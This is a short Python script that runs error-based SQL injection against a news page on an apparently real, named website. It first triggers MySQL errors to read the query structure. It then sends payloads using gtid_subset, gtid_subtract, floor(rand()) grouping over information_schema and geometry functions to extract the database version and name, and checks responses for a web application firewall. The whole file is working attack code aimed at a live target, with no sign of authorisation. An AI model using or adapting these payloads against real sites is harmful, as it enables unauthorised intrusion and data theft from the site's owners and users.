#!/usr/bin/env python3
"""zagroup: get full SQL from error + try gtid/floor error-based extraction"""
import urllib.request, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(8000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

# 1. get full SQL query from error
code, body = fetch(BASE + "?c=259%27")
m = re.search(r'The URL is</b>:\s*<br>([^<]+)<br>', body)
print("URL:", m.group(1) if m else "?")
m2 = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
print("ERR:", m2.group(1)[:300] if m2 else body[:300])

# try to see the full query - many systems print SQL
m3 = re.search(r'(select|SELECT)[^<]{0,300}', body)
print("SQL:", m3.group(0)[:300] if m3 else "not shown")

print("\n=== gtid/floor probes ===")
tests = [
    ("%27%20and%20gtid_subset(concat(0x7e,version()),1)--%20", "gtid-subset"),
    ("%27%20and%20gtid_subtract(concat(0x7e,version()),1)--%20", "gtid-subtract"),
    ("%27%20and%20(select%201%20from%20(select%20count(*),concat(version(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--%20", "floor"),
    ("%27%20and%20(select%201%20from%20(select%20count(*),concat(database(),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)--%20", "floor-db"),
    ("%27%20and%20ST_LatFromGeoHash(version())--%20", "st-lat"),
    ("%27%20and%20ST_LongFromGeoHash(version())--%20", "st-long"),
    ("%27%20and%20geometrycollection(version())--%20", "geometry"),
]
for p, tag in tests:
    code, body = fetch(BASE + "?c=259" + p)
    waf = code == 403
    m = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    errmsg = m.group(1)[:120] if m else ""
    print("%-15s code=%s waf=%s size=%d %s" % (tag, code, waf, len(body), errmsg))
